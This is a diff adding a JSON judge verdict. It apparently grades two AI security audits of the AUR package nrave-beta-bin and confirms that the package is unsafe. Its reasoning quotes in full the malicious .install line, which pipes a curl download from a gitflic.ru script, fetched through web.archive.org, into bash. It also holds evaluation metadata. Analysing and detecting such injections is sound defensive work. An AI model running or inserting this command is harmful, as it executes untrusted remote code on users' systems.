@@ -1,0 +1,28 @@
+{
+  "package": "nrave-beta-bin",
+  "correct_verdict": "unsafe",
+  "confidence": "high",
+  "reasoning": "Both models independently identified a critical supply-chain injection in nrave-beta-bin.install: line 9 executes `bash <(curl -L 'https://web.archive.org/web/https://gitflic.ru/project/hellscripter/install-scripts/blob/raw?file=linux.sh' 2>/dev/null)`, which downloads and runs arbitrary remote code during package installation. This is a classic curl-pipe-to-bash pattern fetching from an unrelated third-party source (gitflic.ru user 'hellscripter') via web.archive.org proxy, with no checksums or verification. This serves no legitimate purpose for a Brave browser package and executes with package manager privileges, constituting a genuine backdoor injection.",
+  "disagreement_analysis": null,
+  "coverage_issues": [],
+  "false_positives": [],
+  "false_negatives": [],
+  "re_audit_recommended": false,
+  "re_audit_focus": [],
+  "learnings": [
+    "Models correctly identified curl-pipe-to-bash patterns in .install files as malicious injections rather than false positives",
+    "The use of web.archive.org as a proxy to obscure the true source URL was appropriately flagged as suspicious by both models",
+    "Models successfully distinguished between genuine remote code execution attacks and normal packaging practices (e.g., setuid bits on chrome-sandbox, standard launcher scripts)",
+    "Both models reviewed all relevant executable files (.install, PKGBUILD, shell scripts) without coverage gaps"
+  ],
+  "_judge_usage": {
+    "model": "qwen/qwen3.7-plus",
+    "prompt_tokens": 9302,
+    "completion_tokens": 915,
+    "cost": 0.00414784
+  },
+  "audits_judged": [
+    "20261014-030839-qwen-qwen3-235b-a22b-2507.md",
+    "20261014-030804-deepseek-deepseek-v4-flash.md"
+  ]
+}
